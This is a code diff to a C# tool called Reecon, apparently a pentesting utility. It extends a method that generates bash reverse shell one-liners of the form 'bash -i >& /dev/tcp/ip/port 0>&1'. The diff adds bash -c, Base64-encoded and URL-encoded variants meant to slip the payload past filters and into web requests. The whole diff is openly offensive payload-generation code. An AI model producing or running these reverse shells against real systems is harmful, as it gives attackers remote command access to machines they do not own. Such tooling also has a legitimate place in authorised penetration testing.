@@ -107,7 +107,16 @@ namespace Reecon
         private static string BashShell(string ip, string port)
         {
             // http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-            return "#!/bin/bash" + Environment.NewLine + "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1" + Environment.NewLine + "Note: File header is only required if it's a file and not a command";
+            string shell = $"bash -i >& /dev/tcp/{ip}/{port} 0>&1";
+            string saferShell = "bash -c \"" + shell + "\"";
+            string saferBase64Shell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(saferShell));
+            string saferURLEncodedShell = $"bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22";
+            return "#!/bin/bash" + Environment.NewLine +
+                   shell + Environment.NewLine +
+                   "Note: File header is only required if it's a file and not a command" + Environment.NewLine +
+                   "Safer: " + saferShell + Environment.NewLine +
+                   "Safer Base64: " + saferBase64Shell + Environment.NewLine +
+                   $"Safer URL Encoded: " + saferURLEncodedShell;
         }
 
         private static string JavaShell(string ip, string port)
